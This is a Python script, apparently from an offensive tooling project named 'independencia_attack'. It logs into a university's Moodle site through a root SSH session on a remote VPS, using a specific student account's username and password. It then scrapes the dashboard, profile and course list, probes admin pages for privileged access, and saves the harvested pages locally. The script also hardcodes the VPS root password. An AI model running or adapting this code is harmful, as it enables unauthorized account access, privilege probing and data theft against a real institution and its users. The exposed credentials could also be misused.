#!/usr/bin/env python3
"""HEXAGON GLM 5.2 - Moodle login verification for aguzmango:Capacita-1"""
import paramiko, json, time, re, sys, io
from datetime import datetime, timezone
sys.stdout = io.TextIOWrapper(sys.stdout.buffer, encoding="utf-8", errors="replace")
sys.stderr = io.TextIOWrapper(sys.stderr.buffer, encoding="utf-8", errors="replace")

VPS_HOST = "64.177.88.10"; VPS_USER = "root"; VPS_PASS = "5F.jyTK$D6%.F{a="
MOODLE_URL = "https://universidad.findep.mx/login/index.php"
MOODLE_BASE = "https://universidad.findep.mx"

def ssh_exec(client, cmd, timeout=60):
    stdin, stdout, stderr = client.exec_command(cmd, timeout=timeout)
    return stdout.read().decode("utf-8", errors="replace"), stderr.read().decode("utf-8", errors="replace")

def safe_print(s, maxlen=3000):
    s = str(s)
    if len(s) > maxlen: s = s[:maxlen] + "...[truncated]"
    try: print(s)
    except: print(repr(s)[:maxlen])

def main():
    print(f"[*] Connecting to VPS...")
    client = paramiko.SSHClient()
    client.set_missing_host_key_policy(paramiko.AutoAddPolicy())
    client.connect(VPS_HOST, username=VPS_USER, password=VPS_PASS, timeout=30)
    print("[+] Connected")

    log = {}
    cookie_file = "/tmp/moodle_verify_cookies.txt"

    # Step 1: GET login page
    cmd = (f"curl -sk -m 15 -A 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) "
           f"AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0 Safari/537.36' "
           f"-c {cookie_file} '{MOODLE_URL}' -o /tmp/mv_login.html")
    ssh_exec(client, cmd, timeout=20)
    out, _ = ssh_exec(client, "cat /tmp/mv_login.html", timeout=10)
    m = re.search(r'name="logintoken"\s+value="([^"]+)"', out)
    token = m.group(1) if m else ""
    print(f"  Login token: {token}")

    # Step 2: POST login with aguzmango:Capacita-1, follow redirects
    cmd = (f"curl -sk -m 25 -A 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) "
           f"AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0 Safari/537.36' "
           f"-b {cookie_file} -c {cookie_file} -L "
           f"-e '{MOODLE_URL}' "
           f"--data-urlencode 'username=aguzmango' "
           f"--data-urlencode 'password=Capacita-1' "
           f"--data-urlencode 'logintoken={token}' "
           f"-o /tmp/mv_dashboard.html "
           f"-w 'HTTP:%{{http_code}} SIZE:%{{size_download}} REDIR:%{{redirect_url}} EFFECTIVE_URL:%{{url_effective}}' "
           f"'{MOODLE_URL}'")
    out, _ = ssh_exec(client, cmd, timeout=30)
    print(f"  Login response: {out.strip()}")
    log["login_response"] = out.strip()

    # Read dashboard
    out, _ = ssh_exec(client, "cat /tmp/mv_dashboard.html", timeout=15)
    log["dashboard_html"] = out
    print(f"  Dashboard size: {len(out)}")

    # Look for indicators
    print("\n[*] === Login indicators ===")
    indicators = {
        "success": ["bienvenido", "welcome", "dashboard", "mycourses", "miscursos",
                    "cerrar sesión", "log out", "logout", "perfil", "profile",
                    "mi página", "mypage", "admin", "administrador", "moodle/session",
                    "testsession", "loginredirect", "error", "invalidlogin"],
    }
    for cat, inds in indicators.items():
        found = []
        for ind in inds:
            if ind.lower() in out.lower():
                found.append(ind)
        print(f"  {cat}: {found}")

    # Check for admin indicators
    print("\n[*] === Admin check ===")
    admin_inds = ["site administration", "administración del sitio", "settings.php",
                  "admin/settings", "siteadmin", "administrador del sitio",
                  "panel de administración", "user management", "gestión de usuarios"]
    for ind in admin_inds:
        if ind.lower() in out.lower():
            print(f"  FOUND: {ind}")

    # Look for course / menu links
    print("\n[*] === Course/Menu links ===")
    links = re.findall(r'href="([^"]+)"', out)
    interesting = [l for l in links if any(k in l.lower() for k in
                   ["course", "curso", "profile", "perfil", "admin", "message",
                    "calendar", "grade", "calificacion", "user", "usuario",
                    "login", "logout", "session"])]
    for l in interesting[:30]:
        print(f"  {l}")
    log["interesting_links"] = interesting[:50]

    # Check user profile
    print("\n[*] === User profile check ===")
    cmd = (f"curl -sk -m 15 -A 'Mozilla/5.0' -b {cookie_file} -c {cookie_file} "
           f"-o /tmp/mv_profile.html -w 'HTTP:%{{http_code}} SIZE:%{{size_download}}' "
           f"'{MOODLE_BASE}/user/profile.php'")
    out, _ = ssh_exec(client, cmd, timeout=20)
    print(f"  Profile: {out.strip()}")
    out, _ = ssh_exec(client, "cat /tmp/mv_profile.html", timeout=10)
    log["profile_html"] = out
    # Extract user info
    for pat in [r'<title>([^<]+)</title>', r'class="page-header-headings"[^>]*>([^<]+)',
                r'fullname[^>]*>([^<]+)', r'"name":"([^"]+)"']:
        m = re.search(pat, out)
        if m:
            print(f"  Found: {m.group(1)[:100]}")

    # Check /my/ dashboard
    print("\n[*] === /my/ dashboard ===")
    cmd = (f"curl -sk -m 15 -A 'Mozilla/5.0' -b {cookie_file} -c {cookie_file} "
           f"-o /tmp/mv_my.html -w 'HTTP:%{{http_code}} SIZE:%{{size_download}}' "
           f"'{MOODLE_BASE}/my/'")
    out, _ = ssh_exec(client, cmd, timeout=20)
    print(f"  /my/: {out.strip()}")
    out, _ = ssh_exec(client, "cat /tmp/mv_my.html", timeout=10)
    log["my_html"] = out
    # Course list
    courses = re.findall(r'href="(/course/view\.php\?id=\d+)"[^>]*>([^<]+)', out)
    print(f"  Courses found: {len(courses)}")
    for c in courses[:20]:
        print(f"    {c[0]} -> {c[1].strip()}")
    log["courses"] = courses

    # Check admin area
    print("\n[*] === Admin area check ===")
    cmd = (f"curl -sk -m 15 -A 'Mozilla/5.0' -b {cookie_file} -c {cookie_file} "
           f"-o /tmp/mv_admin.html -w 'HTTP:%{{http_code}} SIZE:%{{size_download}}' "
           f"'{MOODLE_BASE}/admin/search.php'")
    out, _ = ssh_exec(client, cmd, timeout=20)
    print(f"  /admin/search.php: {out.strip()}")
    out, _ = ssh_exec(client, "cat /tmp/mv_admin.html", timeout=10)
    log["admin_html"] = out
    if "access" in out.lower() and "denied" in out.lower():
        print("  -> Access denied (not admin)")
    elif "administration" in out.lower():
        print("  -> Admin access possible!")
        safe_print(out[:2000])

    log["timestamp"] = datetime.now(timezone.utc).isoformat()
    out_file = r"c:\xampp\htdocs\pentagi\independencia_attack\hexagon_glm_moodle_verify.json"
    with open(out_file, "w", encoding="utf-8") as f:
        json.dump(log, f, indent=2, ensure_ascii=False)
    print(f"\n[+] Verification saved to {out_file}")

    client.close()

if __name__ == "__main__":
    main()
